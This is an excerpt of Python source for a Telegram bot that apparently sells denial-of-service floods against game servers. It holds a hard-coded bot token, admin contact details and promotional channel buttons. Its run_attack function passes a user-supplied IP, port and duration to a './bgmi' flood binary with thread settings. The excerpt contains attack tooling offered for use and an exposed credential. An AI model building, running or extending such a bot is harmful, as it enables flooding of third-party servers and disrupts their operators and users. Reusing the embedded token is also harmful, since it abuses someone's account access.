...
# Bot token
BOT_TOKEN = '7535070436:AAE3-WuNUYUCwyEXi3J3jAq9y21yQkyihh0'  # Replace with your bot token

# Admin ID
ADMIN_ID = 1094467055

# Admin information
ADMIN_USERNAME = "❄️HORUS❄️"
ADMIN_CONTACT = "`@HORUS_999`"
...
db = client["HORUSG3"]  # Database name
...
def get_default_buttons():
    keyboard = [
        [InlineKeyboardButton("💖 JOIN OUR CHANNEL 💖", url="https://t.me/magicgameserver")],
        [InlineKeyboardButton("👻 CONTACT OWNER 👻", url="https://t.me/HORUS_999")]
    ]
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    welcome_message = (
        ...
        "💫 The owner of this bot is ❄️HORUS❄️. Contact `@HORUS_999`."
    )
...
async def run_attack(ip, port, time_duration, update, user_id):
    ...
    try:
        command = f"./bgmi {ip} {port} {time_duration} {8} {default_thread}"
